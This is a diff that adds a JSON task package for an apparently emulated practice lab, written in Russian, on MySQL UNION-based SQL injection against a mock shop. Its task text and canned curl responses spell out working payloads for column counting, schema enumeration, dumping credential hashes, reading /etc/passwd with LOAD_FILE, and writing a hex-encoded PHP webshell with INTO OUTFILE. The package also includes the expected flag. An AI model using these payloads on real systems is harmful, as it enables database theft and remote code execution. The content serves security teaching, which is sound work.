@@ -1,0 +1,30 @@
+{
+  "id": "web-sqli-dbms-open",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{mysql_un10n_t0_0utf1l3_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: MySQL — от UNION-дампа к RCE через INTO OUTFILE\n\n`https://shop.t/?id=1` — магазин на MySQL. Текст ошибки выдаёт диалект.\nПройди путь: фингерпринт → метаданные → дамп → запись webshell.\n\n1. Кавычка называет СУБД:\n\n   curl -s \"https://shop.t/?id=1'\"\n\n2. Колонки и версия:\n\n   curl -s \"https://shop.t/?id=1 ORDER BY 4-- -\"\n   curl -s \"https://shop.t/?id=-1 UNION SELECT 1,@@version,3-- -\"\n\n3. Метаданные (MySQL держит их в information_schema):\n\n   curl -s \"https://shop.t/?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -\"\n   curl -s \"https://shop.t/?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -\"\n\n4. Дамп пользователей (пароли в md5, у admin — флаг):\n\n   curl -s \"https://shop.t/?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -\" > found.txt\n\n5. Проверь права на запись и напиши webshell:\n\n   curl -s \"https://shop.t/?id=-1 UNION SELECT 1,@@secure_file_priv,3-- -\"\n   curl -s \"https://shop.t/?id=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e,3 INTO OUTFILE '/var/www/html/s.php'-- -\"\n   curl -s \"https://shop.t/s.php?c=id\"\n\n6. Набери `check` (флаг уже в found.txt из шага 4).\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.t)",
+      "cases": [
+        { "match": "id=1(%27|')", "example": "-s \"https://shop.t/?id=1'\"", "output": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1\n" },
+        { "match": "ORDER BY 4|ORDER%20BY%204", "example": "-s 'https://shop.t/?id=1 ORDER BY 4-- -'", "output": "ERROR 1054 (42S22): Unknown column '4' in 'order clause'\n" },
+        { "match": "ORDER BY", "example": "-s 'https://shop.t/?id=1 ORDER BY 3-- -'", "output": "... Laptop ...\n" },
+        { "match": "@@version", "example": "-s 'https://shop.t/?id=-1 UNION SELECT 1,@@version,3-- -'", "output": "... 8.0.32 ...\n" },
+        { "match": "user\\(\\)|user%28%29", "example": "-s 'https://shop.t/?id=-1 UNION SELECT 1,user(),3-- -'", "output": "... app@localhost ...\n" },
+        { "match": "information_schema\\.tables", "example": "-s '... UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables ...'", "output": "... users,orders,secrets ...\n" },
+        { "match": "information_schema\\.columns", "example": "-s '... UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns ...'", "output": "... id,username,password,role ...\n" },
+        { "match": "FROM users", "example": "-s '... UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -'", "output": "... admin:5f4dcc3b5aa765d61d8327deb882cf99:nto{mysql_un10n_t0_0utf1l3_rce} ...\n" },
+        { "match": "secure_file_priv", "example": "-s '... UNION SELECT 1,@@secure_file_priv,3-- -'", "output": "...  ...\n" },
+        { "match": "LOAD_FILE", "example": "-s '... UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3-- -'", "output": "... root:x:0:0:root:/root:/bin/bash ...\n" },
+        { "match": "INTO OUTFILE", "example": "-s '... UNION SELECT 1,0x3c3f...3f3e,3 INTO OUTFILE 0x2f7661722f7777772f68746d6c2f732e706870-- -'", "output": "Query OK, 1 row affected\n" },
+        { "match": "s\\.php.*cmd=id|cmd=id", "example": "-s 'https://shop.t/s.php?c=id'", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только магазин shop.t и его webshell.\n"
+    }
+  }
+}
